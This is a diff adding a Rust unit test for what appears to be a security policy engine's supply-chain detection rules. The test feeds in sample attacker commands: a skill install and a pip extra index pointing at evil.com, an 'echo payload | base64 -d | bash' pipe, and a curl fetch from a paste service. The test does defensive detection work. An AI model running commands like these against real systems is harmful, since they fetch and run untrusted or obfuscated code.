@@ -2065,4 +2065,36 @@ rules:
         let ev = make_exec_event(&["ufw", "disable"]);
         assert!(engine.evaluate(&ev).is_some(), "literal substring should still work");
     }
+
+    #[test]
+    fn test_supply_chain_policy_loads_and_matches() {
+        let policies_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("policies");
+        let engine = PolicyEngine::load(&policies_dir).unwrap();
+        // supply-chain.yaml has 6 rules, default.yaml has more — just verify supply-chain rules are present
+        assert!(engine.rule_count() >= 6, "Expected at least 6 supply-chain rules, got {}", engine.rule_count());
+
+        // Verify a skill install from URL triggers warning
+        let ev = make_exec_event(&["skill", "install", "https://evil.com/backdoor"]);
+        let verdict = engine.evaluate(&ev).unwrap();
+        assert_eq!(verdict.rule_name, "detect-skill-install-from-url");
+        assert_eq!(verdict.severity, Severity::Warning);
+
+        // Verify pip untrusted index triggers warning
+        let ev = make_exec_event(&["pip", "install", "--extra-index-url", "https://evil.com/pypi", "requests"]);
+        let verdict = engine.evaluate(&ev).unwrap();
+        assert_eq!(verdict.rule_name, "detect-pip-untrusted-index");
+        assert_eq!(verdict.severity, Severity::Warning);
+
+        // Verify base64 decode exec triggers critical
+        let ev = make_exec_event(&["bash", "-c", "echo payload | base64 -d | bash"]);
+        let verdict = engine.evaluate(&ev).unwrap();
+        assert_eq!(verdict.severity, Severity::Critical);
+
+        // Verify paste service fetch triggers warning
+        let ev = make_exec_event(&["curl", "https://rentry.co/abc/raw"]);
+        let verdict = engine.evaluate(&ev).unwrap();
+        assert!(verdict.rule_name == "detect-paste-service-fetch" ||
+                verdict.rule_name == "block-data-exfiltration",
+                "Expected paste-service or data-exfil rule, got: {}", verdict.rule_name);
+    }
 }
